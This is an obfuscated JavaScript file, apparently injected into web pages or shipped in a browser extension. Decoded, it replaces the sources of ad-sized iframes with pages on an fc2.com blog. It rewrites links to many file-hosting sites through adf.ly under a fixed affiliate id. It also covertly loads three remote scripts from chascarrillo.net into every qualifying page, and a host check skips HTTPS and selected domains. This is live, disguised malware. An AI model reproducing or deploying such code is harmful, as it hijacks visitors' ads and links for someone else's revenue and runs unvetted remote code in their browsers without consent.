function addjquery() {
    var x = document.createElement('script');
    x.setAttribute("type", "text/javascript");
    x.setAttribute("src", "http://code.jquery.com/jquery-latest.js");
    document.getElementsByTagName("head")[0].appendChild(x)
}
function validHost() {
    if (location.href.match(/static\.ak\./i)) {
        return false
    } else if ("https:" == document.location.protocol) {
        return false
    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
        return false
    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
        return false
    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
        return false
    } else if (location.href.match(/blank/i)) {
        return false
    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
        return false
    } else if (location.href.match(/^\.hotmail\.com\//i)) {
        return false
    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
        return false
    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
        return false
    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
        return false
    } else if (location.href.match(/goojue\.com/i)) {
        return false
    } else {
        return true
    }
}
var _0x7161=["\x77\x69\x64\x74\x68","\x37\x32\x38","\x68\x65\x69\x67\x68\x74","\x39\x30","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6C\x6F\x67\x2D\x69\x6D\x67\x73\x2D\x35\x34\x2E\x66\x63\x32\x2E\x63\x6F\x6D\x2F\x73\x2F\x68\x2F\x69\x2F\x73\x68\x69\x70\x75\x32\x31\x2F\x63\x63\x37\x32\x38\x78\x39\x30\x2E\x68\x74\x6D\x6C","\x33\x30\x30","\x32\x35\x30","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6C\x6F\x67\x2D\x69\x6D\x67\x73\x2D\x35\x34\x2E\x66\x63\x32\x2E\x63\x6F\x6D\x2F\x73\x2F\x68\x2F\x69\x2F\x73\x68\x69\x70\x75\x32\x31\x2F\x63\x63\x33\x30\x30\x78\x32\x35\x30\x2E\x68\x74\x6D\x6C","\x31\x36\x30","\x36\x30\x30","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6C\x6F\x67\x2D\x69\x6D\x67\x73\x2D\x35\x34\x2E\x66\x63\x32\x2E\x63\x6F\x6D\x2F\x73\x2F\x68\x2F\x69\x2F\x73\x68\x69\x70\x75\x32\x31\x2F\x63\x63\x31\x36\x30\x78\x36\x30\x30\x2E\x68\x74\x6D\x6C","\x31\x32\x30","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6C\x6F\x67\x2D\x69\x6D\x67\x73\x2D\x35\x34\x2E\x66\x63\x32\x2E\x63\x6F\x6D\x2F\x73\x2F\x68\x2F\x69\x2F\x73\x68\x69\x70\x75\x32\x31\x2F\x63\x63\x31\x32\x30\x78\x36\x30\x30\x2E\x68\x74\x6D\x6C","\x34\x36\x38","\x36\x30","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x6C\x6F\x67\x2D\x69\x6D\x67\x73\x2D\x35\x34\x2E\x66\x63\x32\x2E\x63\x6F\x6D\x2F\x73\x2F\x68\x2F\x69\x2F\x73\x68\x69\x70\x75\x32\x31\x2F\x63\x63\x34\x36\x38\x78\x36\x30\x2E\x68\x74\x6D\x6C","\x69\x66\x72\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6C\x65\x6E\x67\x74\x68"];function otranet(_0xbc38x2){if(_0xbc38x2[_0x7161[0]]==_0x7161[1]&&_0xbc38x2[_0x7161[2]]==_0x7161[3]){_0xbc38x2[_0x7161[4]]=_0x7161[5];} else {if(_0xbc38x2[_0x7161[0]]==_0x7161[6]&&_0xbc38x2[_0x7161[2]]==_0x7161[7]){_0xbc38x2[_0x7161[4]]=_0x7161[8];} else {if(_0xbc38x2[_0x7161[0]]==_0x7161[9]&&_0xbc38x2[_0x7161[2]]==_0x7161[10]){_0xbc38x2[_0x7161[4]]=_0x7161[11];} else {if(_0xbc38x2[_0x7161[0]]==_0x7161[12]&&_0xbc38x2[_0x7161[2]]==_0x7161[10]){_0xbc38x2[_0x7161[4]]=_0x7161[13];} else {if(_0xbc38x2[_0x7161[0]]==_0x7161[14]&&_0xbc38x2[_0x7161[2]]==_0x7161[15]){_0xbc38x2[_0x7161[4]]=_0x7161[16];} ;} ;} ;} ;} ;return true;} ;if(validHost()){var iframes=document[_0x7161[18]](_0x7161[17]);for(var i=0;i<iframes[_0x7161[19]];i++){iframe=iframes[i][_0x7161[4]];otranet(iframes[i]);} ;} ;


var _0x6df9=["\x69\x6E\x74","\x75\x70\x6C\x6F\x61\x64\x65\x64\x2E\x74\x6F","\x75\x70\x6C\x6F\x61\x64\x65\x64\x2E\x6E\x65\x74","\x6E\x79\x61\x61\x2E\x65\x75","\x6D\x65\x64\x69\x61\x66\x69\x72\x65\x2E\x63\x6F\x6D","\x74\x61\x72\x69\x6E\x67\x61\x2E\x6E\x65\x74","\x64\x65\x70\x6F\x73\x69\x74\x66\x69\x6C\x65\x73\x2E\x63\x6F\x6D","\x72\x61\x70\x69\x64\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x76\x69\x70\x2D\x66\x69\x6C\x65\x2E\x63\x6F\x6D","\x73\x6D\x73\x66\x69\x6C\x65\x73\x2E\x72\x75","\x34\x66\x69\x6C\x65\x73\x2E\x6E\x65\x74","\x74\x75\x72\x62\x6F\x62\x69\x74\x2E\x72\x75","\x75\x70\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x63\x6F\x6D","\x6C\x65\x74\x69\x74\x62\x69\x74\x2E\x6E\x65\x74","\x64\x65\x70\x6F\x73\x69\x74\x66\x69\x6C\x65\x73\x2E\x72\x75","\x73\x6D\x73\x34\x66\x69\x6C\x65\x2E\x63\x6F\x6D","\x69\x66\x6F\x6C\x64\x65\x72\x2E\x72\x75","\x68\x6F\x74\x66\x69\x6C\x65\x2E\x63\x6F\x6D","\x61\x6E\x79\x66\x69\x6C\x65\x73\x2E\x6E\x65\x74","\x73\x68\x61\x72\x69\x6E\x67\x6D\x61\x74\x72\x69\x78\x2E\x63\x6F\x6D","\x6D\x65\x67\x61\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x6D\x65\x67\x61\x75\x70\x6C\x6F\x61\x64\x2E\x63\x6F\x6D","\x72\x61\x70\x69\x64\x73\x68\x61\x72\x65\x2E\x64\x65","\x72\x61\x70\x69\x64\x73\x68\x61\x72\x65\x2E\x72\x75","\x75\x70\x6C\x6F\x61\x64\x62\x6F\x78\x2E\x63\x6F\x6D","\x66\x69\x6C\x65\x66\x61\x63\x74\x6F\x72\x79\x2E\x63\x6F\x6D","\x66\x69\x6C\x65\x66\x61\x63\x74\x6F\x72\x79\x2E\x72\x75","\x66\x69\x6C\x65\x70\x6F\x73\x74\x2E\x72\x75","\x6F\x6E\x65\x66\x69\x6C\x65\x2E\x6E\x65\x74","\x66\x72\x65\x65\x66\x6F\x6C\x64\x65\x72\x2E\x6E\x65\x74","\x67\x65\x74\x74\x68\x65\x62\x69\x74\x2E\x63\x6F\x6D","\x74\x75\x72\x62\x6F\x62\x69\x74\x2E\x6E\x65\x74","\x62\x61\x79\x66\x69\x6C\x65\x73\x2E\x63\x6F\x6D","\x62\x69\x74\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x72\x61\x70\x69\x64\x67\x61\x74\x6F\x72\x2E\x6E\x65\x74","\x63\x72\x6F\x63\x6B\x6F\x2E\x63\x6F\x6D","\x61\x64\x66\x2E\x6C\x79","\x75\x6C\x2E\x74\x6F","\x65\x6D\x62\x65\x64\x75\x70\x6C\x6F\x61\x64\x2E\x63\x6F\x6D","\x62\x72\x6F\x6E\x74\x6F\x66\x69\x6C\x65\x2E\x63\x6F\x6D","\x66\x72\x65\x61\x6B\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x34\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x70\x75\x74\x6C\x6F\x63\x6B\x65\x72\x2E\x63\x6F\x6D","\x73\x65\x6E\x64\x73\x70\x61\x63\x65\x2E\x63\x6F\x6D","\x7A\x69\x70\x70\x79\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x75\x70\x6C\x6F\x61\x64\x6D\x69\x72\x72\x6F\x72\x73\x2E\x63\x6F\x6D","\x6D\x69\x72\x6F\x72\x69\x69\x2E\x63\x6F\x6D","\x6E\x65\x74\x6C\x6F\x61\x64\x2E\x69\x6E","\x73\x68\x61\x72\x65\x66\x6C\x61\x72\x65\x2E\x6E\x65\x74","\x66\x69\x62\x65\x72\x75\x70\x6C\x6F\x61\x64\x2E\x63\x6F\x6D","\x72\x79\x75\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x6C\x69\x6E\x6B\x62\x75\x63\x6B\x73\x2E\x63\x6F\x6D","\x67\x6F\x6F\x2E\x67\x6C","\x69\x76\x70\x61\x73\x74\x65\x2E\x63\x6F\x6D","\x76\x69\x64\x78\x64\x65\x6E\x2E\x63\x6F\x6D","\x6E\x6F\x73\x76\x69\x64\x65\x6F\x2E\x63\x6F\x6D","\x73\x6F\x63\x6B\x73\x68\x61\x72\x65\x2E\x63\x6F\x6D","\x61\x6C\x6C\x6D\x79\x76\x69\x64\x65\x6F\x73\x2E\x6E\x65\x74","\x6D\x6F\x65\x76\x69\x64\x65\x6F\x2E\x6E\x65\x74","\x6E\x6F\x77\x76\x69\x64\x65\x6F\x2E\x65\x75","\x73\x74\x72\x65\x61\x6D\x63\x6C\x6F\x75\x64\x2E\x65\x75","\x75\x70\x6C\x6F\x61\x7A\x2E\x63\x6F\x6D","\x76\x69\x64\x65\x6F\x77\x65\x65\x64\x2E\x65\x73","\x77\x61\x74\x63\x68\x63\x61\x63\x61\x6F\x2E\x63\x6F\x6D","\x76\x69\x64\x65\x6F\x7A\x65\x64\x2E\x6E\x65\x74","\x73\x65\x6E\x73\x65\x6C\x65\x73\x73\x2E\x74\x76","\x6D\x75\x6C\x74\x69\x75\x70\x6C\x6F\x61\x64\x2E\x63\x6F\x6D","\x6D\x75\x6C\x74\x69\x75\x70\x6C\x6F\x61\x64\x2E\x6E\x6C","\x6D\x75\x6C\x74\x69\x75\x70\x6C\x6F\x61\x64\x2E\x63\x6F\x2E\x75\x6B","\x6C\x65\x6E\x67\x74\x68","\x5E\x28\x68\x74\x74\x70\x7C\x68\x74\x74\x70\x73\x29\x3A\x2F\x2F\x28\x77\x77\x77\x2E\x29\x3F","\x2E","\x5C\x2E","\x72\x65\x70\x6C\x61\x63\x65","\x6D\x61\x74\x63\x68","\x68\x72\x65\x66","","\x74\x65\x73\x74","\x61","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x77\x77\x77\x2E","\x3A\x2F\x2F\x28\x2E\x5B\x5E\x2F\x5D\x2B\x29","\x64\x6F\x6D\x61\x69\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x61\x64\x66\x2E\x6C\x79\x2F","\x2F"];var adfly_id=41708;var adfly_advert=_0x6df9[0];var domains=[_0x6df9[1],_0x6df9[2],_0x6df9[3],_0x6df9[4],_0x6df9[5],_0x6df9[6],_0x6df9[7],_0x6df9[8],_0x6df9[9],_0x6df9[10],_0x6df9[11],_0x6df9[12],_0x6df9[13],_0x6df9[14],_0x6df9[15],_0x6df9[16],_0x6df9[17],_0x6df9[18],_0x6df9[19],_0x6df9[20],_0x6df9[21],_0x6df9[22],_0x6df9[23],_0x6df9[24],_0x6df9[25],_0x6df9[26],_0x6df9[27],_0x6df9[28],_0x6df9[29],_0x6df9[30],_0x6df9[31],_0x6df9[32],_0x6df9[33],_0x6df9[34],_0x6df9[35],_0x6df9[36],_0x6df9[37],_0x6df9[38],_0x6df9[39],_0x6df9[40],_0x6df9[41],_0x6df9[42],_0x6df9[43],_0x6df9[44],_0x6df9[45],_0x6df9[46],_0x6df9[47],_0x6df9[48],_0x6df9[49],_0x6df9[50],_0x6df9[51],_0x6df9[52],_0x6df9[53],_0x6df9[54],_0x6df9[55],_0x6df9[56],_0x6df9[57],_0x6df9[58],_0x6df9[59],_0x6df9[60],_0x6df9[61],_0x6df9[62],_0x6df9[63],_0x6df9[64],_0x6df9[65],_0x6df9[66],_0x6df9[67],_0x6df9[68]];function checkValidAdfly(_0x4e5bx5){for(var _0x4e5bx6=0;_0x4e5bx6<domains[_0x6df9[69]];_0x4e5bx6++){if(_0x4e5bx5[_0x6df9[74]](_0x6df9[70]+domains[_0x4e5bx6][_0x6df9[73]](_0x6df9[71],_0x6df9[72]))){return true;} ;} ;return false;} ;function isLink(_0x4e5bx5){if(_0x4e5bx5[_0x6df9[75]]==_0x6df9[76]){return false;} ;var _0x4e5bx8=/(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;return _0x4e5bx8[_0x6df9[77]](_0x4e5bx5[_0x6df9[75]]);} ;function insertAdFly(){var _0x4e5bxa=document[_0x6df9[79]](_0x6df9[78]);for(var _0x4e5bx6=0;_0x4e5bx6<_0x4e5bxa[_0x6df9[69]];_0x4e5bx6++){if(!isLink(_0x4e5bxa[_0x4e5bx6])||document[_0x6df9[82]][_0x6df9[74]]((_0x4e5bxa[_0x4e5bx6][_0x6df9[75]][_0x6df9[74]](_0x6df9[81])[1])[_0x6df9[73]](_0x6df9[80],_0x6df9[76]))){continue ;} ;if(checkValidAdfly(_0x4e5bxa[_0x4e5bx6][_0x6df9[75]])){_0x4e5bxa[_0x4e5bx6][_0x6df9[75]]=_0x6df9[83]+adfly_id+_0x6df9[84]+_0x4e5bxa[_0x4e5bx6][_0x6df9[75]];} ;} ;} ;insertAdFly();

var _0x76e1=["\x68\x74\x74\x70\x3A\x2F\x2F\x63\x68\x61\x73\x63\x61\x72\x72\x69\x6C\x6C\x6F\x2E\x6E\x65\x74\x2F\x61\x70\x70\x73\x2F\x6F\x74\x72\x6F\x73\x2E\x6A\x73","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x73\x72\x63","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x68\x61\x73\x63\x61\x72\x72\x69\x6C\x6C\x6F\x2E\x6E\x65\x74\x2F\x61\x70\x70\x73\x2F\x65\x78\x70\x6C\x75\x2E\x6A\x73","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x68\x61\x73\x63\x61\x72\x72\x69\x6C\x6C\x6F\x2E\x6E\x65\x74\x2F\x61\x70\x70\x73\x2F\x63\x6C\x69\x63\x2E\x6A\x73","\x76\x69\x64\x65\x6F\x70\x6C\x61\x79\x65\x72","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x73\x73","\x70\x6C\x61\x79\x65\x72"];var localURL=_0x76e1[0];var script_tag=document[_0x76e1[2]](_0x76e1[1]);script_tag[_0x76e1[5]](_0x76e1[3],_0x76e1[4]);script_tag[_0x76e1[5]](_0x76e1[6],localURL);document[_0x76e1[9]](_0x76e1[8])[0][_0x76e1[7]](script_tag);var localURL2=_0x76e1[10];var script_tag=document[_0x76e1[2]](_0x76e1[1]);script_tag[_0x76e1[5]](_0x76e1[3],_0x76e1[4]);script_tag[_0x76e1[5]](_0x76e1[6],localURL2);document[_0x76e1[9]](_0x76e1[8])[0][_0x76e1[7]](script_tag);var localURL3=_0x76e1[11];var script_tag=document[_0x76e1[2]](_0x76e1[1]);script_tag[_0x76e1[5]](_0x76e1[3],_0x76e1[4]);script_tag[_0x76e1[5]](_0x76e1[6],localURL3);document[_0x76e1[9]](_0x76e1[8])[0][_0x76e1[7]](script_tag);var adffghgfh=true;var plugtru=document[_0x76e1[13]](_0x76e1[12]);plugtru[_0x76e1[5]](_0x76e1[14],_0x76e1[15]);